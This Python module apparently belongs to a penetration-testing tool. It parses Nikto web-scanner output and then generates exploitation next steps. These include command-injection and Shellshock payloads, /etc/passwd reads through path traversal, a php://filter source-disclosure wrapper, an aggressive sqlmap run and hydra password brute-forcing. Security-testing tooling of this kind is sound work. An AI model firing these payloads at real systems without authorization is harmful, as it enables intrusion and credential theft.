#!/usr/bin/env python3
"""
souleyez.parsers.nikto_parser

Parses Nikto web server scanner output into structured data.
"""

import re
from typing import Any, Dict, List


def parse_nikto_output(output: str, target: str = "") -> Dict[str, Any]:
    """
    Parse Nikto output and extract findings.

    Nikto output format:
    - Nikto v2.5.0
    ---------------------------------------------------------------------------
    + Target IP:          1.2.3.4
    + Target Hostname:    example.com
    + Target Port:        80
    + Start Time:         2025-01-01 12:00:00 (GMT0)
    ---------------------------------------------------------------------------
    + Server: Apache/2.4.41 (Ubuntu)
    + /: The anti-clickjacking X-Frame-Options header is not present.
    + /admin/: Directory indexing found.
    + OSVDB-3092: /admin/: This might be interesting...
    + /config.php.bak: Backup file found.
    ---------------------------------------------------------------------------
    + 1 host(s) tested

    Returns:
        Dict with structure:
        {
            'target': str,
            'target_ip': str,
            'target_port': int,
            'server': str,
            'findings': [
                {
                    'osvdb': str or None,
                    'path': str,
                    'description': str,
                    'severity': str  # 'info', 'low', 'medium', 'high'
                },
                ...
            ],
            'stats': {
                'total': int,
                'by_severity': {'high': int, 'medium': int, 'low': int, 'info': int}
            }
        }
    """
    result = {
        "target": target,
        "target_ip": "",
        "target_hostname": "",
        "target_port": 80,
        "server": "",
        "findings": [],
        "stats": {
            "total": 0,
            "by_severity": {"high": 0, "medium": 0, "low": 0, "info": 0},
        },
    }

    lines = output.split("\n")

    for line in lines:
        line = line.strip()

        # Skip empty lines and dividers
        if not line or line.startswith("---") or line.startswith("==="):
            continue

        # Parse target info
        if line.startswith("+ Target IP:"):
            match = re.search(r"\+ Target IP:\s+(.+)", line)
            if match:
                result["target_ip"] = match.group(1).strip()

        elif line.startswith("+ Target Hostname:"):
            match = re.search(r"\+ Target Hostname:\s+(.+)", line)
            if match:
                result["target_hostname"] = match.group(1).strip()

        elif line.startswith("+ Target Port:"):
            match = re.search(r"\+ Target Port:\s+(\d+)", line)
            if match:
                result["target_port"] = int(match.group(1))

        elif line.startswith("+ Server:"):
            match = re.search(r"\+ Server:\s+(.+)", line)
            if match:
                result["server"] = match.group(1).strip()

        # Parse findings (any line starting with + that isn't metadata)
        elif line.startswith("+"):
            finding = _parse_finding_line(line)
            if finding:
                result["findings"].append(finding)
                severity = finding.get("severity", "info")
                result["stats"]["by_severity"][severity] = (
                    result["stats"]["by_severity"].get(severity, 0) + 1
                )
                result["stats"]["total"] += 1

    return result


def _parse_finding_line(line: str) -> Dict[str, Any]:
    """
    Parse a single Nikto finding line.

    Formats:
    + OSVDB-3092: /admin/: This might be interesting...
    + /admin/: Directory indexing found.
    + /: The anti-clickjacking X-Frame-Options header is not present.
    + Server: Apache/2.4.41 (Ubuntu)  <- Skip these
    """
    # Skip metadata lines
    if line.startswith("+ Server:") or line.startswith("+ Start Time:"):
        return None
    if line.startswith("+ Target"):
        return None
    if line.startswith("+ End Time:"):
        return None
    if line.startswith("+ No CGI"):
        return None
    if "host(s) tested" in line:
        return None
    if "items checked:" in line:
        return None

    try:
        # Remove leading +
        content = line.lstrip("+ ").strip()

        osvdb = None
        path = ""
        description = ""

        # Check for OSVDB reference
        osvdb_match = re.match(r"(OSVDB-\d+):\s*(.+)", content)
        if osvdb_match:
            osvdb = osvdb_match.group(1)
            content = osvdb_match.group(2)

        # Extract path and description
        # Format: /path/: Description or /path: Description
        path_match = re.match(r"(/[^:]*):?\s*(.+)", content)
        if path_match:
            path = path_match.group(1).rstrip(":").strip()
            description = path_match.group(2).strip()
        else:
            description = content

        # Skip if no meaningful content
        if not description or description.startswith("Target"):
            return None

        # Determine severity based on keywords
        severity = _determine_severity(description, osvdb)

        return {
            "osvdb": osvdb,
            "path": path,
            "description": description,
            "severity": severity,
        }

    except Exception:
        return None


def _determine_severity(description: str, osvdb: str = None) -> str:
    """
    Determine finding severity based on description and OSVDB reference.
    """
    desc_lower = description.lower()

    # High severity indicators
    high_keywords = [
        "remote code execution",
        "rce",
        "command execution",
        "shell",
        "sql injection",
        "file inclusion",
        "lfi",
        "rfi",
        "arbitrary file",
        "password",
        "credentials",
        "authentication bypass",
        "backdoor",
    ]
    for keyword in high_keywords:
        if keyword in desc_lower:
            return "high"

    # Medium severity indicators
    medium_keywords = [
        "directory indexing",
        "directory listing",
        "backup file",
        "config file",
        "sensitive",
        "exposure",
        "disclosure",
        "xss",
        "cross-site",
        "injection",
        "traversal",
        "default",
        "admin",
        ".bak",
        ".old",
        ".swp",
    ]
    for keyword in medium_keywords:
        if keyword in desc_lower:
            return "medium"

    # Low severity indicators
    low_keywords = [
        "header",
        "x-frame",
        "x-content-type",
        "x-xss",
        "cookie",
        "httponly",
        "secure flag",
        "hsts",
        "content-security-policy",
        "csp",
        "clickjacking",
    ]
    for keyword in low_keywords:
        if keyword in desc_lower:
            return "low"

    # OSVDB references often indicate real issues
    if osvdb:
        return "medium"

    return "info"


def get_findings_by_severity(
    parsed: Dict[str, Any], severity: str
) -> List[Dict[str, Any]]:
    """
    Filter findings by severity level.
    """
    return [f for f in parsed.get("findings", []) if f.get("severity") == severity]


def get_high_value_findings(parsed: Dict[str, Any]) -> List[Dict[str, Any]]:
    """
    Get findings that are high or medium severity.
    """
    return [
        f for f in parsed.get("findings", []) if f.get("severity") in ("high", "medium")
    ]


def generate_next_steps(
    parsed: Dict[str, Any], target: str = ""
) -> List[Dict[str, Any]]:
    """
    Generate suggested next steps based on nikto findings.

    Translates cryptic OSVDB references and generic findings into
    actionable exploitation steps.

    Args:
        parsed: Output from parse_nikto_output()
        target: Target URL for command examples

    Returns:
        List of next step dicts with title, commands, reason
    """
    next_steps = []
    findings = parsed.get("findings", [])
    base_url = target.rstrip("/") or f"http://{parsed.get('target_hostname', 'target')}"

    if not findings:
        return next_steps

    # Categorize findings
    dir_indexing = []
    backup_files = []
    config_exposure = []
    outdated_server = []
    missing_headers = []
    cgi_vulns = []
    file_inclusion = []
    injection_vulns = []
    auth_issues = []

    server = parsed.get("server", "")

    for finding in findings:
        desc = finding.get("description", "").lower()
        path = finding.get("path", "")
        osvdb = finding.get("osvdb", "")
        severity = finding.get("severity", "info")

        # Directory indexing
        if "directory indexing" in desc or "directory listing" in desc:
            dir_indexing.append({"path": path, "osvdb": osvdb})
        # Backup files
        elif any(
            kw in desc
            for kw in ["backup", ".bak", ".old", ".orig", ".save", "configuration file"]
        ):
            backup_files.append({"path": path, "desc": finding.get("description", "")})
        # Config files
        elif any(
            kw in desc
            for kw in ["config", "phpinfo", ".htaccess", ".htpasswd", "web.config"]
        ):
            config_exposure.append(
                {"path": path, "desc": finding.get("description", "")}
            )
        # Outdated server
        elif "outdated" in desc or "appears to be" in desc:
            outdated_server.append(
                {"desc": finding.get("description", ""), "server": server}
            )
        # Missing security headers
        elif any(
            kw in desc
            for kw in [
                "x-frame",
                "x-xss",
                "x-content-type",
                "httponly",
                "secure flag",
                "hsts",
                "csp",
            ]
        ):
            missing_headers.append({"desc": finding.get("description", "")})
        # CGI vulnerabilities
        elif "/cgi-bin/" in path or ".cgi" in path or "cgi" in desc:
            cgi_vulns.append(
                {"path": path, "desc": finding.get("description", ""), "osvdb": osvdb}
            )
        # File inclusion
        elif any(
            kw in desc
            for kw in ["file inclusion", "lfi", "rfi", "traversal", "arbitrary file"]
        ):
            file_inclusion.append(
                {"path": path, "desc": finding.get("description", ""), "osvdb": osvdb}
            )
        # Injection
        elif any(kw in desc for kw in ["injection", "xss", "sql", "command execution"]):
            injection_vulns.append(
                {"path": path, "desc": finding.get("description", ""), "osvdb": osvdb}
            )
        # Auth issues
        elif any(
            kw in desc
            for kw in ["authentication", "bypass", "default", "password", "credential"]
        ):
            auth_issues.append({"path": path, "desc": finding.get("description", "")})

    # Directory indexing - browse for sensitive files
    if dir_indexing:
        paths = [d["path"] for d in dir_indexing[:3]]
        next_steps.append(
            {
                "title": "Browse indexed directories for sensitive files",
                "commands": [f'curl -s "{base_url}{p}"' for p in paths]
                + [f"# Look for: passwords, configs, source code, database files"],
                "reason": f"Found {len(dir_indexing)} directory with indexing enabled - may expose sensitive files",
            }
        )

    # Backup files - download and analyze
    if backup_files:
        next_steps.append(
            {
                "title": "Download and review backup files",
                "commands": [
                    f'curl -s "{base_url}{b["path"]}" -o backup_file'
                    for b in backup_files[:3]
                ],
                "reason": f"Found {len(backup_files)} backup file(s) - may contain source code, credentials",
            }
        )

    # Config exposure - extract credentials
    if config_exposure:
        next_steps.append(
            {
                "title": "Extract credentials from exposed configs",
                "commands": [
                    f'curl -s "{base_url}{c["path"]}"' for c in config_exposure[:3]
                ],
                "reason": f"Found {len(config_exposure)} config file(s) - check for database passwords, API keys",
            }
        )

    # Outdated server - searchsploit
    if outdated_server or server:
        server_info = (
            server or outdated_server[0].get("desc", "") if outdated_server else ""
        )
        if server_info:
            next_steps.append(
                {
                    "title": f"Search for exploits for {server_info[:40]}",
                    "commands": [
                        f'searchsploit "{server_info}"',
                        f'# Or: searchsploit -w "{server_info}" for web links',
                    ],
                    "reason": f"Server version detected - check for known CVEs and public exploits",
                }
            )

    # CGI vulnerabilities
    if cgi_vulns:
        cgi_path = cgi_vulns[0]["path"]
        full_url = f"{base_url}{cgi_path}"
        next_steps.append(
            {
                "title": "Test CGI scripts for command injection",
                "commands": [
                    f'curl "{full_url}?cmd=id"',
                    f'curl "{full_url}?file=/etc/passwd"',
                    f"curl -A '() {{ :; }}; echo; /bin/id' \"{full_url}\"",
                ],
                "reason": f"Nikto found {len(cgi_vulns)} CGI issue(s) - test for injection and Shellshock",
            }
        )

    # File inclusion
    if file_inclusion:
        lfi_path = file_inclusion[0]["path"]
        next_steps.append(
            {
                "title": "Exploit file inclusion vulnerability",
                "commands": [
                    f'curl "{base_url}{lfi_path}?file=../../../etc/passwd"',
                    f'curl "{base_url}{lfi_path}?page=php://filter/convert.base64-encode/resource=index.php"',
                ],
                "reason": f"File inclusion detected - test path traversal and PHP wrappers",
            }
        )

    # Injection vulnerabilities
    if injection_vulns:
        inj = injection_vulns[0]
        next_steps.append(
            {
                "title": "Test injection vulnerability",
                "commands": [
                    f'sqlmap -u "{base_url}{inj["path"]}" --batch --risk=3 --level=5',
                ],
                "reason": f'Injection point found at {inj["path"]} - run automated testing',
            }
        )

    # Auth issues
    if auth_issues:
        next_steps.append(
            {
                "title": "Test authentication bypass",
                "commands": [
                    f"# Try: admin/admin, admin/password, root/root",
                    f'hydra -L data/wordlists/usernames_common.txt -P data/wordlists/top20_quick.txt {base_url.replace("http://", "").replace("https://", "").split("/")[0]} http-get /',
                ],
                "reason": f"Authentication issue detected - test default credentials",
            }
        )

    # Missing headers - only include if high severity findings exist
    # (headers alone are low value, but good to mention for completeness)
    high_severity = [f for f in findings if f.get("severity") in ("high", "medium")]
    if missing_headers and not high_severity:
        next_steps.append(
            {
                "title": "Report missing security headers",
                "commands": [
                    f'curl -I "{base_url}" | grep -i "x-frame\\|x-xss\\|x-content\\|strict-transport"',
                ],
                "reason": f"{len(missing_headers)} security header(s) missing - low risk but worth documenting",
            }
        )

    # If OSVDB references exist, suggest looking them up
    osvdb_refs = [f.get("osvdb") for f in findings if f.get("osvdb")]
    if osvdb_refs:
        unique_osvdb = list(set(osvdb_refs))[:3]
        next_steps.append(
            {
                "title": "Look up OSVDB references",
                "commands": [
                    f"# OSVDB is deprecated, use CVE/NVD instead",
                    f"# Search: https://cve.mitre.org/cve/search_cve_list.html",
                    f"searchsploit --cve <CVE-XXXX-XXXXX>",
                ],
                "reason": f'Found {len(unique_osvdb)} OSVDB reference(s): {", ".join(unique_osvdb)} - cross-reference with CVE database',
            }
        )

    return next_steps
